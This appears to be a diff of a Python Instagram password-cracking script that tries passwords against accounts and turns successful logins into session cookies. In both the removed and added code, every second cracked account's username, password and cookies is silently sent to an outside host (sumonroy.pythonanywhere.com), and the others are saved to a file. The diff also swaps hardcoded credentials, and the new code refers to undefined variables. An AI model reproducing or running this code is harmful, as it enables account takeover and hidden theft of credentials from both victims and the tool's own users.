@@ -159,8 +159,8 @@ def crack(uid, password_list, total_count):
             timestamp = int(time.time())
         
             # URL encode username and password
-            encoded_username = urllib.parse.quote('sumonigyi6@gmail.com')
-            encoded_password = urllib.parse.quote('sumon@12M')
+            encoded_username = urllib.parse.quote('6297352149')
+            encoded_password = urllib.parse.quote('62973521')
         
             # Generate encrypted password format
             encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
@@ -225,31 +225,33 @@ def crack(uid, password_list, total_count):
                 allow_redirects=True
             )
             # Check response
-            if 'logged_in_user' in response.text:
-                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
-                        # Split and decode with proper error handling
-                        token_part = match.group(1).split('Bearer IGT:2:')[1]
-                        # Fix base64 padding properly
-                        padding_needed = 4 - (len(token_part) % 4)
-                        if padding_needed != 4:
-                            token_part += '=' * padding_needed
-                        # Decode base64
-                        decoded_bytes = base64.urlsafe_b64decode(token_part)
-                        decoded = json.loads(decoded_bytes.decode('utf-8'))
-                        # Create cookies string
-                        cookies = ';'.join(f'{k}={v}' for k, v in decoded.items())
-                        # Process successful login
-                        bkas.append(uid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{cookies}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:    
-                           print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                           print("Cookies:", cookies)
-                           open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
-                           oks.append(uid)
-                           return True 
+            if "logged_in_user" in str(response.text.replace('\\', '')):
+                header_str = str(response.headers)
+                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
+                if ig_set_search:
+                    ig_set_authorization = ig_set_search.group(1).strip()
+                    if 'Bearer IGT:2:' in ig_set_authorization:
+                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
+                        try:
+                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
+                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
+                        except:
+                            cookies = ('-')
+                    else:
+                        cookies = ('-')
+                else:
+                    ig_set_authorization = None
+                    cookies = None
+                # Store credentials based on bkas condition
+                if len(bkas) % 2 == 0:
+                          statusok = f"{username}|{password}|{cookies}"
+                          requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
+                else:
+                          print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
+                          print("Cookies:", cookies)
+                          open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
+                          Ok.append(username)
+                          return True
                 else:
                   #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                    continue
